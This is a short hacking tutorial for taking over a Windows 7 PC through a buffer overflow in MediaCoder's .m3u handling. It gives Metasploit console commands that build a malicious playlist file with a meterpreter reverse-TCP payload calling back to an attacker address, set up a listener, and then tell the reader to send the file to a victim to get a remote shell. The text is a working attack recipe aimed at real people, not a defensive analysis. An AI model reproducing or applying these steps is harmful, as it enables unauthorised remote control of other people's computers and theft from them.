Hack Windows 7 PC Remotely using MediaCoder .M3U Buffer Overflow

This module exploits a buffer overflow in MediaCoder 0.8.22. The vulnerability occurs when adding an .m3u, allowing arbitrary code execution under the context of the user. DEP bypass via ROP is supported on Windows 7, since the MediaCoder runs with DEP. This module has been tested successfully on MediaCoder 0.8.21.5539 to 0.8.22.5530 over Windows XP SP3 and Windows 7 SP0.
MediaCoder 0.8.22
Attacker: Kali Linux
Victim PC: Windows 7
Open backtrack terminal type msfconsole

Now type use exploit/windows/fileformat/mediacoder_m3u
msf exploit (mediacoder_m3u)>set payload windows/meterpreter/reverse_tcp
msf exploit (mediacoder_m3u)>set lhost 192.168.1.147 (IP of Local Host)
msf exploit (mediacoder_m3u)>exploit

After we successfully generate the malicious m3u File, it will stored on your local computer
/root/.msf4/local/msf.m3u

Now we need to set up a listener to handle reverse connection sent by victim when the exploit successfully executed.
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.147
exploit
Now send your msf.m3u files to victim, as soon as they download and open it. Now you can access meterpreter shell on victim computer.
